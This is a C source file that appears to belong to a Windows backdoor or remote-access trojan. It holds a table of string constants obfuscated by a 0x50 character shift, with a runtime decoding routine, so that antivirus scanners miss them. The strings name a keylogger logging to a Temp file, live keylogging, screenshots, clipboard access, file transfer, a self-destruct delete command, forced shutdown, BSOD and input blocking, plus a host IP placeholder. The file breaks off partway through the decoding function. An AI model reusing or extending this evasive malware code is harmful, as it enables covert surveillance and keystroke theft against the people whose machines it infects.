#include "main.h"

// binary obfuscation macros
#define h(a)   (a) + 0x50 // hide letter
//#define UNHIDE_STRING(str)  do { char * ptr = str ; while (*ptr) *ptr++ -= 0x50; } while(0)
//#define HIDE_STRING(str)  do {char * ptr = str ; while (*ptr) *ptr++ += 0x50;} while(0)

static void UNHIDE_STRING(char* str) {
	while (*str) *str++ -= 0x50;
}

/*
static void HIDE_STRING(char* str) {
	while (*str) *str++ += 0x50;
}
*/

// main stuff
char SHELL_STRING_HOST_IP[] = { h('1'), h('2'), h('7'), h('.'), h('0'), h('.'), h('0'), h('.'), h('1'), '\0' }; // 127.0.0.1
char SHELL_STRING_ON[] = { h('o'), h('n'), '\0' };
char SHELL_STRING_OFF[] = { h('o'), h('f'), h('f'), '\0' };

// modes
char SHELL_STRING_MODE_UNKNOWN[] = { h('U'), h('N'), h('K'), h('N'), h('O'), h('W'), h('N'), '\0' };
char SHELL_STRING_MODE_SERVICE[] = { h('S'), h('E'), h('R'), h('V'), h('I'), h('C'), h('E'), '\0' };
char SHELL_STRING_MODE_USER[]    = { h('U'), h('S'), h('E'), h('R'),  '\0' };
char SHELL_STRING_MODE_KEYLOG[]  = { h('K'), h('E'), h('Y'), h('L'), h('O'), h('G'), '\0' };

// getenv 
char SHELL_STRING_GETENV_USERNAME[]     = { h('U'), h('S'), h('E'), h('R'), h('N'), h('A'), h('M'), h('E'), '\0' };
char SHELL_STRING_GETENV_USERDOMAIN[]   = { h('U'), h('S'), h('E'), h('R'), h('D'), h('O'), h('M'), h('A'), h('I'), h('N'), '\0' };
char SHELL_STRING_GETENV_TEMP[]         = { h('T'), h('E'), h('M'), h('P'), '\0'  };
char SHELL_STRING_GETENV_APPDATA[]      = { h('A'), h('P'), h('P'), h('D'), h('A'), h('T'), h('A'), '\0' };
char SHELL_STRING_GETENV_PROGRAMFILES[] = { h('P'), h('R'), h('O'), h('G'), h('R'), h('A'), h('M'), h('F'), h('I'), h('L'), h('E'), h('S'), '\0' };

// paths
char SHELL_STRING_PATH_TEMP[]          = { h('C'), h(':'), h('\\'), h('W'), h('i'), h('n'), h('d'), h('o'), h('w'), h('s'), h('\\'), h('T'), h('e'), h('m'), h('p'), '\0' };
char SHELL_STRING_PATH_TEMP_SET_INI[]  = { h('C'), h(':'), h('\\'), h('W'), h('i'), h('n'), h('d'), h('o'), h('w'), h('s'), h('\\'), h('T'), h('e'), h('m'), h('p'), h('\\'), h('s'), h('e'), h('t'), h('.'), h('i'), h('n'), h('i'), '\0' };
char SHELL_STRING_PATH_TEMP_KEYS_LOG[] = { h('C'), h(':'), h('\\'), h('W'), h('i'), h('n'), h('d'), h('o'), h('w'), h('s'), h('\\'), h('T'), h('e'), h('m'), h('p'), h('\\'), h('k'), h('e'), h('y'), h('s'), h('.'), h('l'), h('o'), h('g'), '\0' };

// prompts
char SHELL_STRING_STOPSHELL[] = { h('S'), h('t'), h('o'), h('p'), h(' '), h('s'), h('h'), h('e'), h('l'), h('l'), h('?'), h(' '), h('['), h('y'), h('/'), h('N'), h(']'), h(':'), h(' '), '\0' };
char SHELL_STRING_STOPSERV[]  = { h('S'), h('t'), h('o'), h('p'), h(' '), h('s'), h('e'), h('r'), h('v'), h('i'), h('c'), h('e'), h('?'), h(' '), h('['), h('y'), h('/'), h('N'), h(']'), h(':'), h(' '), '\0' };
char SHELL_STRING_SUICIDE[]   = { h('s'), h('e'), h('l'), h('f'), h(' '), h('d'), h('e'), h('s'), h('t'), h('r'), h('u'), h('c'), h('t'), h('?'), h(' '), h('['), h('y'), h('/'), h('N'), h(']'), h(':'), h(' '), '\0' };

// msgs
char SHELL_STRING_MSG_MISSINGARGS[] = { h('m'), h('i'), h('s'), h('s'), h('i'), h('n'), h('g'), h(' '), h('a'), h('r'), h('g'), h('u'), h('m'), h('e'), h('n'), h('t'), h('s'), h(','), h(' '), h('t'), h('y'), h('p'), h('e'), h(' '), h('\''), h('h'), h('e'), h('l'), h('p'), h('\''), h(' '), h('f'), h('o'), h('r'), h(' '), h('h'), h('e'), h('l'), h('p'), h('.'), h('.'), h('.'), h('\n'), '\0' };
char SHELL_STRING_MSG_HELPDISABLED[] = { h('h'), h('e'), h('l'), h('p'), h(' '), h('d'), h('i'), h('s'), h('a'), h('b'), h('l'), h('e'), h('d'), h(' '), h('o'), h('n'), h(' '), h('b'), h('u'), h('i'), h('l'), h('d'), h(' '), h('('), h('m'), h('a'), h('s'), h('k'), h(')'), h('.'), h('.'), h('.'), h('\n'), '\0' };
char SHELL_STRING_MSG_CHDIRFAILED[] = { h('f'), h('a'), h('i'), h('l'), h('e'), h('d'), h(' '), h('t'), h('o'), h(' '), h('c'), h('h'), h('a'), h('n'), h('g'), h('e'), h(' '), h('d'), h('i'), h('r'), h('\n'), '\0' };
char SHELL_STRING_MSG_FAILEDTORUN[] = { h('f'), h('a'), h('i'), h('l'), h('e'), h('d'), h(' '), h('t'), h('o'), h(' '), h('s'), h('t'), h('a'), h('r'), h('t'), h(' '), h('p'), h('r'), h('o'), h('c'), h('e'), h('s'), h('s'), h('\n'), '\0' };
char SHELL_STRING_MSG_FAILEDTORUNCMD[] = { h('f'), h('a'), h('i'), h('l'), h('e'), h('d'), h(' '), h('t'), h('o'), h(' '), h('r'), h('u'), h('n'), h(' '), h('c'), h('o'), h('m'), h('m'), h('a'), h('n'), h('d'), h('\n'), '\0' };
char SHELL_STRING_MSG_CLIPBOARD_OPEN_SUCC[] = { h('o'), h('p'), h('e'), h('n'), h('e'), h('d'), h(' '), h('t'), h('h'), h('e'), h(' '), h('c'), h('l'), h('i'), h('p'), h('b'), h('o'), h('a'), h('r'), h('d'), h('\n'), '\0' };
char SHELL_STRING_MSG_CLIPBOARD_OPEN_FAIL[] = { h('f'), h('a'), h('i'), h('l'), h('e'), h('d'), h(' '), h('t'), h('o'), h(' '), h('o'), h('p'), h('e'), h('n'), h(' '), h('c'), h('l'), h('i'), h('p'), h('b'), h('o'), h('a'), h('r'), h('d'), h('\n'), '\0' };
char SHELL_STRING_MSG_CLIPBOARD_CLOSE_SUCC[] = { h('c'), h('l'), h('o'), h('s'), h('e'), h('d'), h(' '), h('t'), h('h'), h('e'), h(' '), h('c'), h('l'), h('i'), h('p'), h('b'), h('o'), h('a'), h('r'), h('d'), h('\n'), '\0' }; 
char SHELL_STRING_MSG_CLIPBOARD_CLOSE_FAIL[] = { h('f'), h('a'), h('i'), h('l'), h('e'), h('d'), h(' '), h('t'), h('o'), h(' '), h('c'), h('l'), h('o'), h('s'), h('e'), h(' '), h('c'), h('l'), h('i'), h('p'), h('b'), h('o'), h('a'), h('r'), h('d'), h('\n'), '\0' };
char SHELL_STRING_MSG_KEYLOGGER_STOPPING[] = { h('s'), h('t'), h('o'), h('p'), h('p'), h('i'), h('n'), h('g'), h(' '), h('k'), h('e'), h('y'), h('l'), h('o'), h('g'), h('g'), h('e'), h('r'), h('.'), h('.'), h('.'), h('\n'), '\0' };
char SHELL_STRING_MSG_KEYLOGGER_STOPPED[] = { h('s'), h('t'), h('o'), h('p'), h('p'), h('e'), h('d'), h(' '), h('k'), h('e'), h('y'), h('l'), h('o'), h('g'), h('g'), h('e'), h('r'), h('\n'), '\0' };
char SHELL_STRING_MSG_LIVEKEYLOGGER_STOPPING[] = { h('s'), h('t'), h('o'), h('p'), h('p'), h('i'), h('n'), h('g'), h(' '), h('l'), h('i'), h('v'), h('e'), h(' '), h('k'), h('e'), h('y'), h('l'), h('o'), h('g'), h('g'), h('e'), h('r'), h('.'), h('.'), h('.'), h('\n'), '\0' };
char SHELL_STRING_MSG_LIVEKEYLOGGER_STOPPED[] = { h('s'), h('t'), h('o'), h('p'), h('p'), h('e'), h('d'), h(' '), h('l'), h('i'), h('v'), h('e'), h(' '), h('k'), h('e'), h('y'), h('l'), h('o'), h('g'), h('g'), h('e'), h('r'), h('\n'), '\0' };
char SHELL_STRING_MSG_SSFAILED[] = { h('f'), h('a'), h('i'), h('l'), h('e'), h('d'), h(' '), h('t'), h('o'), h(' '), h('s'), h('a'), h('v'), h('e'), h(' '), h('s'), h('c'), h('r'), h('e'), h('e'), h('n'), h('s'), h('h'), h('o'), h('t'), h('\n'), '\0' };

// sendrecv msgs
char SHELL_STRING_SENDRECV_MSG_CONNECT[]   = { h('c'), h('o'), h('n'), h('n'), h('e'), h('c'), h('t'), h('i'), h('n'), h('g'), h('.'), h('.'), h('.'), h('\n'), '\0' };
char SHELL_STRING_SENDRECV_MSG_SENDING[]   = { h('s'), h('e'), h('n'), h('d'), h('i'), h('n'), h('g'), h('.'), h('.'), h('.'), h('\n'), '\0' };
char SHELL_STRING_SENDRECV_MSG_RECVING[]   = { h('r'), h('e'), h('c'), h('e'), h('i'), h('v'), h('i'), h('n'), h('g'), h('.'), h('.'), h('.'), h('\n'), '\0' };
char SHELL_STRING_SENDRECV_MSG_COMPLETED[] = { h('c'), h('o'), h('m'), h('p'), h('l'), h('e'), h('t'), h('e'), h('d'), h('\n'), '\0' };
char SHELL_STRING_SENDRECV_ERROR_SOCKET[]  = { h('E'), h('R'), h('R'), h('O'), h('R'), h(':'), h(' '), h('f'), h('a'), h('i'), h('l'), h('e'), h('d'), h(' '), h('t'), h('o'), h(' '), h('c'), h('r'), h('e'), h('a'), h('t'), h('e'), h(' '), h('s'), h('o'), h('c'), h('k'), h('e'), h('t'), h('\n'), '\0' };
char SHELL_STRING_SENDRECV_ERROR_CONNECT[] = { h('E'), h('R'), h('R'), h('O'), h('R'), h(':'), h(' '), h('f'), h('a'), h('i'), h('l'), h('e'), h('d'), h(' '), h('t'), h('o'), h(' '), h('c'), h('o'), h('n'), h('n'), h('n'), h('e'), h('c'), h('t'), h('\n'), '\0' };
char SHELL_STRING_SENDRECV_ERROR_FOPEN[]   = { h('E'), h('R'), h('R'), h('O'), h('R'), h(':'), h(' '), h('f'), h('a'), h('i'), h('l'), h('e'), h('d'), h(' '), h('t'), h('o'), h(' '), h('o'), h('p'), h('e'), h('n'), h(' '), h('f'), h('i'), h('l'), h('e'), h('\n'), '\0' };
char SHELL_STRING_SENDRECV_ERROR_SEND[]    = { h('E'), h('R'), h('R'), h('O'), h('R'), h(':'), h(' '), h('s'), h('e'), h('n'), h('d'), h(' '), h('e'), h('r'), h('r'), h('o'), h('r'), h('\n'), '\0' };

// sprintf
char SHELL_STRING_SPRINTF_DESKTOP[] = { h('C'), h(':'), h('\\'), h('U'), h('s'), h('e'), h('r'), h('s'), h('\\'), h('%'), h('s'), h('\\'), h('D'), h('e'), h('s'), h('k'), h('t'), h('o'), h('p'), '\0' };
char SHELL_STRING_SPRINTF_KEYLOGGER_CLEAN[] = { h('k'), h('e'), h('y'), h('l'), h('o'), h('g'), h('g'), h('e'), h('r'), h(' '), h('c'), h('l'), h('e'), h('a'), h('n'), h(':'), h(' '), h('%'), h('s'), h('\n'), '\0' };
char SHELL_STRING_SPRINTF_LIVEKEYLOGGER_CLEAN[] = { h('l'), h('i'), h('v'), h('e'), h('k'), h('e'), h('y'), h('l'), h('o'), h('g'), h('g'), h('e'), h('r'), h(' '), h('c'), h('l'), h('e'), h('a'), h('n'), h(':'), h(' '), h('%'), h('s'), h('\n'), '\0' };
#ifdef _WIN64
char SHELL_STRING_SPRINTF_SSSF[] = { h('%'), h('s'), h('\\'), h('%'), h('l'), h('l'), h('d'), h('.'), h('t'), h('m'), h('p'), '\0' };
#else
char SHELL_STRING_SPRINTF_SSSF[] = { h('%'), h('s'), h('\\'), h('%'), h('l'), h('d'), h('.'), h('t'), h('m'), h('p'), '\0' };
#endif
char SHELL_STRING_SPRINTF_MCI_OPENMP3[] = { h('o'), h('p'), h('e'), h('n'), h(' '), h('"'), h('%'), h('s'), h('"'), h(' '), h('t'), h('y'), h('p'), h('e'), h(' '), h('m'), h('p'), h('e'), h('g'), h('v'), h('i'), h('d'), h('e'), h('o'), h(' '), h('a'), h('l'), h('i'), h('a'), h('s'), h(' '), h('m'), h('p'), h('3'), '\0' };
char SHELL_STRING_SPRINTF_DEL[] = { h('d'), h('e'), h('l'), h(' '), h('/'), h('Q'), h(' '), h('/'), h('S'), h(' '), h('/'), h('A'), h('-'), h('D'), h(' '), h('"'), h('%'), h('s'), h('"'), '\0' };
char SHELL_STRING_SPRINTF_TIMEOUTDEL[] = { h('t'), h('i'), h('m'), h('e'), h('o'), h('u'), h('t'), h(' '), h('/'), h('t'), h(' '), h('3'), h(' '), h('&'), h('&'), h(' '), h('d'), h('e'), h('l'), h(' '), h('/'), h('Q'), h(' '), h('/'), h('S'), h(' '), h('/'), h('A'), h('-'), h('D'), h(' '), h('"'), h('%'), h('s'), h('"'), '\0' };

// mci stuff
char SHELL_STRING_MCI_PLAYMP3[] = { h('p'), h('l'), h('a'), h('y'), h(' '), h('m'), h('p'), h('3'), '\0' };
char SHELL_STRING_MCI_PLAYMP3REPEAT[] = { h('p'), h('l'), h('a'), h('y'), h(' '), h('m'), h('p'), h('3'), h(' '), h('r'), h('e'), h('p'), h('e'), h('a'), h('t'), '\0' };
char SHELL_STRING_MCI_PAUSEMP3[] = { h('p'), h('a'), h('u'), h('s'), h('e'), h(' '), h('m'), h('p'), h('3'), '\0' };
char SHELL_STRING_MCI_RESUMEMP3[] = { h('r'), h('e'), h('s'), h('u'), h('m'), h('e'), h(' '), h('m'), h('p'), h('3'), '\0' };
char SHELL_STRING_MCI_STOPMP3[] = { h('s'), h('t'), h('o'), h('p'), h(' '), h('m'), h('p'), h('3'), '\0' };
char SHELL_STRING_MCI_CLOSEMP3[] = { h('c'), h('l'), h('o'), h('s'), h('e'), h(' '), h('m'), h('p'), h('3'), '\0' }; 

// commands
char SHELL_STRING_CMD_EXIT[] = { h('e'), h('x'), h('i'), h('t'), '\0' };
char SHELL_STRING_CMD_STOP[] = { h('s'), h('t'), h('o'), h('p'), '\0' };
char SHELL_STRING_CMD_STOPSERV[] = { h('s'), h('t'), h('o'), h('p'), h('s'), h('e'), h('r'), h('v'), '\0' };
char SHELL_STRING_CMD_SUICIDE[] = { h('s'), h('u'), h('i'), h('c'), h('i'), h('d'), h('e'), '\0' };
char SHELL_STRING_CMD_HELP[] = { h('h'), h('e'), h('l'), h('p'), '\0' };
char SHELL_STRING_CMD_PWD[] = { h('p'), h('w'), h('d'), '\0' };
char SHELL_STRING_CMD_BANNER[] = { h('b'), h('a'), h('n'), h('n'), h('e'), h('r'), '\0' };
char SHELL_STRING_CMD_EXE[] = { h('e'), h('x'), h('e'), '\0' };
char SHELL_STRING_CMD_EXEDIR[] = { h('e'), h('x'), h('e'), h('d'), h('i'), h('r'), '\0' };
char SHELL_STRING_CMD_EXIP[] = { h('e'), h('x'), h('i'), h('p'), '\0' };
char SHELL_STRING_CMD_CLIP[] = { h('c'), h('l'), h('i'), h('p'), '\0' };
char SHELL_STRING_CMD_PS1NONE[] = { h('p'), h('s'), h('1'), h('n'), h('o'), h('n'), h('e'), '\0' };
char SHELL_STRING_CMD_PS1MINI[] = { h('p'), h('s'), h('1'), h('m'), h('i'), h('n'), h('i'), '\0' };
char SHELL_STRING_CMD_PS1FULL[] = { h('p'), h('s'), h('1'), h('f'), h('u'), h('l'), h('l'), '\0' };
char SHELL_STRING_CMD_CD[] = { h('c'), h('d'), '\0' };
char SHELL_STRING_CMD_TEMP[] = { h('t'), h('e'), h('m'), h('p'), '\0' };
char SHELL_STRING_CMD_TEMP2[] = { h('t'), h('e'), h('m'), h('p'), h('2'), '\0' };
char SHELL_STRING_CMD_APPDATA[] = { h('a'), h('p'), h('p'), h('d'), h('a'), h('t'), h('a'), '\0' };
char SHELL_STRING_CMD_DX[] = { h('d'), h('x'), '\0' };
char SHELL_STRING_CMD_CDX[] = { h('c'), h('d'), h('x'), '\0' };
char SHELL_STRING_CMD_ID[] = { h('i'), h('d'), '\0' };
char SHELL_STRING_CMD_ID2[] = { h('w'), h('h'), h('o'), h('a'), h('m'), h('i'), '\0' };
char SHELL_STRING_CMD_DISKS[] = { h('d'), h('i'), h('s'), h('k'), h('s'), '\0' };
char SHELL_STRING_CMD_DISKS2[] = { h('w'), h('m'), h('i'), h('c'), h(' '), h('l'), h('o'), h('g'), h('i'), h('c'), h('a'), h('l'), h('d'), h('i'), h('s'), h('k'), h(' '), h('g'), h('e'), h('t'), h(' '), h('n'), h('a'), h('m'), h('e'), '\0' };
char SHELL_STRING_CMD_TITLES[] = { h('t'), h('i'), h('t'), h('l'), h('e'), h('s'), '\0' };
char SHELL_STRING_CMD_TITLES2[] = { h('t'), h('a'), h('s'), h('k'), h('l'), h('i'), h('s'), h('t'), h(' '), h('/'), h('v'), h(' '), h('/'), h('f'), h('o'), h(' '), h('l'), h('i'), h('s'), h('t'), h(' '), h('|'), h(' '), h('f'), h('i'), h('n'), h('d'), h(' '), h('/'), h('i'), h(' '), h('"'), h('w'), h('i'), h('n'), h('d'), h('o'), h('w'), h(' '), h('t'), h('i'), h('t'), h('l'), h('e'), h('"'), h(' '), h('|'), h(' '), h('f'), h('i'), h('n'), h('d'), h(' '), h('/'), h('v'), h(' '), h('"'), h('N'), h('/'), h('A'), h('"'), '\0' };
char SHELL_STRING_CMD_POWEROFF[] = { h('p'), h('o'), h('w'), h('e'), h('r'), h('o'), h('f'), h('f'), '\0' };
char SHELL_STRING_CMD_POWEROFF2[] = { h('s'), h('h'), h('u'), h('t'), h('d'), h('o'), h('w'), h('n'), h(' '), h('/'), h('s'), h(' '), h('/'), h('t'), h(' '), h('0'), '\0' };
char SHELL_STRING_CMD_REBOOT[] = { h('r'), h('e'), h('b'), h('o'), h('o'), h('t'), '\0' };
char SHELL_STRING_CMD_REBOOT2[] = { h('s'), h('h'), h('u'), h('t'), h('d'), h('o'), h('w'), h('n'), h(' '), h('/'), h('r'), h(' '), h('/'), h('t'), h(' '), h('0'), '\0' };
char SHELL_STRING_CMD_DUMPLOG[] = { h('d'), h('u'), h('m'), h('p'), h('l'), h('o'), h('g'), '\0' };
char SHELL_STRING_CMD_DUMPLOG2[] = { h('t'), h('y'), h('p'), h('e'), h(' '), h('C'), h(':'), h('\\'), h('W'), h('i'), h('n'), h('d'), h('o'), h('w'), h('s'), h('\\'), h('T'), h('e'), h('m'), h('p'), h('\\'), h('k'), h('e'), h('y'), h('s'), h('.'), h('l'), h('o'), h('g'), '\0' };
char SHELL_STRING_CMD_PLAYWAV[] = { h('p'), h('l'), h('a'), h('y'), h('w'), h('a'), h('v'), '\0' };
char SHELL_STRING_CMD_LOOPWAV[] = { h('l'), h('o'), h('o'), h('p'), h('w'), h('a'), h('v'), '\0' };
char SHELL_STRING_CMD_STOPWAV[] = { h('s'), h('t'), h('o'), h('p'), h('w'), h('a'), h('v'), '\0' };
char SHELL_STRING_CMD_PLAYMP3[] = { h('p'), h('l'), h('a'), h('y'), h('m'), h('p'), h('3'), '\0' };
char SHELL_STRING_CMD_LOOPMP3[] = { h('l'), h('o'), h('o'), h('p'), h('m'), h('p'), h('3'), '\0' }; 
char SHELL_STRING_CMD_PAUSEMP3[] = { h('p'), h('a'), h('u'), h('s'), h('e'), h('m'), h('p'), h('3'), '\0' };
char SHELL_STRING_CMD_RESUMEMP3[] = { h('r'), h('e'), h('s'), h('u'), h('m'), h('e'), h('m'), h('p'), h('3'), '\0' };
char SHELL_STRING_CMD_STOPMP3[] = { h('s'), h('t'), h('o'), h('p'), h('m'), h('p'), h('3'), '\0' };
char SHELL_STRING_CMD_SS[] = { h('s'), h('s'), '\0' };
char SHELL_STRING_CMD_SSSF[] = { h('s'), h('s'), h('s'), h('f'), '\0' };
char SHELL_STRING_CMD_MSG[] = { h('m'), h('s'), h('g'), '\0' };
char SHELL_STRING_CMD_LP[] = { h('l'), h('p'), '\0' };
char SHELL_STRING_CMD_KILL[] = { h('k'), h('i'), h('l'), h('l'), '\0' };
char SHELL_STRING_CMD_CMON[] = { h('c'), h('m'), h('o'), h('n'), '\0' };
char SHELL_STRING_CMD_CMOFF[] = { h('c'), h('m'), h('o'), h('f'), h('f'), '\0' };
char SHELL_STRING_CMD_KBDON[] = { h('k'), h('b'), h('d'), h('o'), h('n'), '\0' };
char SHELL_STRING_CMD_KBDOFF[] = { h('k'), h('b'), h('d'), h('o'), h('f'), h('f'), '\0' };
char SHELL_STRING_CMD_ATKON[] = { h('a'), h('t'), h('k'), h('o'), h('n'), '\0' };
char SHELL_STRING_CMD_ATKOFF[] = { h('a'), h('t'), h('k'), h('o'), h('f'), h('f'), '\0' };
char SHELL_STRING_CMD_BION[] = { h('b'), h('i'), h('o'), h('n'), '\0' };
char SHELL_STRING_CMD_BIOFF[] = { h('b'), h('i'), h('o'), h('f'), h('f'), '\0' };
char SHELL_STRING_CMD_BIEON[] = { h('b'), h('i'), h('e'), h('o'), h('n'), '\0' };
char SHELL_STRING_CMD_FMUON[] = { h('f'), h('m'), h('u'), h('o'), h('n'), '\0' };
char SHELL_STRING_CMD_FMUOFF[] = { h('f'), h('m'), h('u'), h('o'), h('f'), h('f'), '\0' };
char SHELL_STRING_CMD_BIEOFF[] = { h('b'), h('i'), h('e'), h('o'), h('f'), h('f'), '\0' };
char SHELL_STRING_CMD_OPENCLIP[] = { h('o'), h('p'), h('e'), h('n'), h('c'), h('l'), h('i'), h('p'), '\0' };
char SHELL_STRING_CMD_CLOSECLIP[] = { h('c'), h('l'), h('o'), h('s'), h('e'), h('c'), h('l'), h('i'), h('p'), '\0' };
char SHELL_STRING_CMD_SK[] = { h('s'), h('k'), '\0' };
char SHELL_STRING_CMD_REC[] = { h('r'), h('e'), h('c'), '\0' };
char SHELL_STRING_CMD_RECBG[] = { h('r'), h('e'), h('c'), h('b'), h('g'), '\0' };
char SHELL_STRING_CMD_BSOD[] = { h('b'), h('s'), h('o'), h('d'), '\0' };

char SHELL_STRING_CMD_KL[] = { h('k'), h('l'), '\0' };
char SHELL_STRING_CMD_KLSTOP[] = { h('k'), h('l'), h('s'), h('t'), h('o'), h('p'), '\0' };
char SHELL_STRING_CMD_KLCLEAN[] = { h('k'), h('l'), h('c'), h('l'), h('e'), h('a'), h('n'), '\0' };
char SHELL_STRING_CMD_LKL[] = { h('l'), h('k'), h('l'), '\0' };
char SHELL_STRING_CMD_LKLSTOP[] = { h('l'), h('k'), h('l'), h('s'), h('t'), h('o'), h('p'), '\0' };
char SHELL_STRING_CMD_LKLCLEAN[] = { h('l'), h('k'), h('l'), h('c'), h('l'), h('e'), h('a'), h('n'), '\0' };
char SHELL_STRING_CMD_SF[] = { h('s'), h('f'), '\0' };
char SHELL_STRING_CMD_RF[] = { h('r'), h('f'), '\0' };
char SHELL_STRING_CMD_SFBG[] = { h('s'), h('f'), h('b'), h('g'), '\0' };
char SHELL_STRING_CMD_RFBG[] = { h('r'), h('f'), h('b'), h('g'), '\0' };
char SHELL_STRING_CMD_RUN[] = { h('r'), h('u'), h('n'), '\0' };
char SHELL_STRING_CMD_BG[] = { h('b'), h('g'), '\0' };
char SHELL_STRING_CMD_PROC[] = { h('p'), h('r'), h('o'), h('c'), '\0' };
char SHELL_STRING_CMD_PROCBG[] = { h('p'), h('r'), h('o'), h('c'), h('b'), h('g'), '\0' };
char SHELL_STRING_CMD_BP[] = { h('b'), h('p'), '\0' };
char SHELL_STRING_CMD_USER[] = { h('u'), h('s'), h('e'), h('r'), '\0' };
char SHELL_STRING_CMD_KEYLOG[] = { h('k'), h('e'), h('y'), h('l'), h('o'), h('g'), '\0' };

// call this in your main function
void main_strings() {
	UNHIDE_STRING(SHELL_STRING_HOST_IP);
	UNHIDE_STRING(SHELL_STRING_ON);
	UNHIDE_STRING(SHELL_STRING_OFF);
	UNHIDE_STRING(SHELL_STRING_MODE_UNKNOWN);
	UNHIDE_STRING(SHELL_STRING_MODE_SERVICE);
	UNHIDE_STRING(SHELL_STRING_MODE_USER);
	UNHIDE_STRING(SHELL_STRING_MODE_KEYLOG);
	UNHIDE_STRING(SHELL_STRING_GETENV_USERNAME);
	UNHIDE_STRING(SHELL_STRING_GETENV_USERDOMAIN);
	UNHIDE_STRING(SHELL_STRING_GETENV_TEMP);
	UNHIDE_STRING(SHELL_STRING_GETENV_APPDATA);
	UNHIDE_STRING(SHELL_STRING_GETENV_PROGRAMFILES);
	UNHIDE_STRING(SHELL_STRING_PATH_TEMP);
	UNHIDE_STRING(SHELL_STRING_PATH_TEMP_SET_INI);
	UNHIDE_STRING(SHELL_STRING_PATH_TEMP_KEYS_LOG);
	UNHIDE_STRING(SHELL_STRING_STOPSHELL);
	UNHIDE_STRING(SHELL_STRING_STOPSERV);
	UNHIDE_STRING(SHELL_STRING_SUICIDE);
	UNHIDE_STRING(SHELL_STRING_MSG_MISSINGARGS);
	UNHIDE_STRING(SHELL_STRING_MSG_HELPDISABLED);
	UNHIDE_STRING(SHELL_STRING_MSG_CHDIRFAILED);
	UNHIDE_STRING(SHELL_STRING_MSG_FAILEDTORUN);
	UNHIDE_STRING(SHELL_STRING_MSG_FAILEDTORUNCMD);
	UNHIDE_STRING(SHELL_STRING_MSG_CLIPBOARD_OPEN_SUCC);
	UNHIDE_STRING(SHELL_STRING_MSG_CLIPBOARD_OPEN_FAIL);
	UNHIDE_STRING(SHELL_STRING_MSG_CLIPBOARD_CLOSE_SUCC);
	UNHIDE_STRING(SHELL_STRING_MSG_CLIPBOARD_CLOSE_FAIL);
	UNHIDE_STRING(SHELL_STRING_MSG_KEYLOGGER_STOPPING);
	UNHIDE_STRING(SHELL_STRING_MSG_KEYLOGGER_STOPPED);
	UNHIDE_STRING(SHELL_STRING_MSG_LIVEKEYLOGGER_STOPPING);
	UNHIDE_STRING(SHELL_STRING_MSG_LIVEKEYLOGGER_STOPPED);
	UNHIDE_STRING(SHELL_STRING_MSG_SSFAILED);
	UNHIDE_STRING(SHELL_STRING_SENDRECV_MSG_CONNECT);
	UNHIDE_STRING(SHELL_STRING_SENDRECV_MSG_SENDING);
	UNHIDE_STRING(SHELL_STRING_SENDRECV_MSG_RECVING);
	UNHIDE_STRING(SHELL_STRING_SENDRECV_MSG_COMPLETED);
	UNHIDE_STRING(SHELL_STRING_SENDRECV_ERROR_SOCKET);
	UNHIDE_STRING(SHELL_STRING_SENDRECV_ERROR_CONNECT);
	UNHIDE_STRING(SHELL_STRING_SENDRECV_ERROR_FOPEN);
	UNHIDE_STRING(SHELL_STRING_SENDRECV_ERROR_SEND);
	UNHIDE_STRING(SHELL_STRING_SPRINTF_DESKTOP);
	UNHIDE_STRING(SHELL_STRING_SPRINTF_KEYLOGGER_CLEAN);
	UNHIDE_STRING(SHELL_STRING_SPRINTF_LIVEKEYLOGGER_CLEAN);
	UNHIDE_STRING(SHELL_STRING_SPRINTF_SSSF);
	UNHIDE_STRING(SHELL_STRING_SPRINTF_MCI_OPENMP3);
	UNHIDE_STRING(SHELL_STRING_SPRINTF_DEL);
	UNHIDE_STRING(SHELL_STRING_SPRINTF_TIMEOUTDEL);
	UNHIDE_STRING(SHELL_STRING_MCI_PLAYMP3);
	UNHIDE_STRING(SHELL_STRING_MCI_PLAYMP3REPEAT);
	UNHIDE_STRING(SHELL_STRING_MCI_PAUSEMP3);
	UNHIDE_STRING(SHELL_STRING_MCI_RESUMEMP3);
	UNHIDE_STRING(SHELL_STRING_MCI_STOPMP3);
	UNHIDE_STRING(SHELL_STRING_MCI_CLOSEMP3);
	UNHIDE_STRING(SHELL_STRING_CMD_EXIT);
	UNHIDE_STRING(SHELL_STRING_CMD_STOP);
	UNHIDE_STRING(SHELL_STRING_CMD_STOPSERV);
	UNHIDE_STRING(SHELL_STRING_CMD_SUICIDE);
	UNHIDE_STRING(SHELL_STRING_CMD_HELP);
	UNHIDE_STRING(SHELL_STRING_CMD_PWD);
	UNHIDE_STRING(SHELL_STRING_CMD_BANNER);
	UNHIDE_STRING(SHELL_STRING_CMD_EXE);
	UNHIDE_STRING(SHELL_STRING_CMD_EXEDIR);
	UNHIDE_STRING(SHELL_STRING_CMD_EXIP);
	UNHIDE_STRING(SHELL_STRING_CMD_CLIP);
	UNHIDE_STRING(SHELL_STRING_CMD_PS1NONE);
	UNHIDE_STRING(SHELL_STRING_CMD_PS1MINI);
	UNHIDE_STRING(SHELL_STRING_CMD_PS1FULL);
	UNHIDE_STRING(SHELL_STRING_CMD_CD);
	UNHIDE_STRING(SHELL_STRING_CMD_TEMP);
	UNHIDE_STRING(SHELL_STRING_CMD_TEMP2);
	UNHIDE_STRING(SHELL_STRING_CMD_APPDATA);
	UNHIDE_STRING(SHELL_STRING_CMD_DX);
	UNHIDE_STRING(SHELL_STRING_CMD_CDX);
	UNHIDE_STRING(SHELL_STRING_CMD_ID);
	UNHIDE_STRING(SHELL_STRING_CMD_ID2);
	UNHIDE_STRING(SHELL_STRING_CMD_DISKS);
	UNHIDE_STRING(SHELL_STRING_CMD_DISKS2);
	UNHIDE_STRING(SHELL_STRING_CMD_TITLES);
	UNHIDE_STRING(SHELL_STRING_CMD_TITLES2);
	UNHIDE_STRING(SHELL_STRING_CMD_POWEROFF);
	UNHIDE_STRING(SHELL_STRING_CMD_POWEROFF2);
	UNHIDE_STRING(SHELL_STRING_CMD_REBOOT);
	UNHIDE_STRING(SHELL_STRING_CMD_REBOOT2);
	UNHIDE_STRING(SHELL_STRING_CMD_DUMPLOG);
	UNHIDE_STRING(SHELL_STRING_CMD_DUMPLOG2);
	UNHIDE_STRING(SHELL_STRING_CMD_PLAYWAV);
	UNHIDE_STRING(SHELL_STRING_CMD_LOOPWAV);
	UNHIDE_STRING(SHELL_STRING_CMD_STOPWAV);
	UNHIDE_STRING(SHELL_STRING_CMD_PLAYMP3);
	UNHIDE_STRING(SHELL_STRING_CMD_LOOPMP3);
	UNHIDE_STRING(SHELL_STRING_CMD_PAUSEMP3);
	UNHIDE_STRING(SHELL_STRING_CMD_RESUMEMP3);
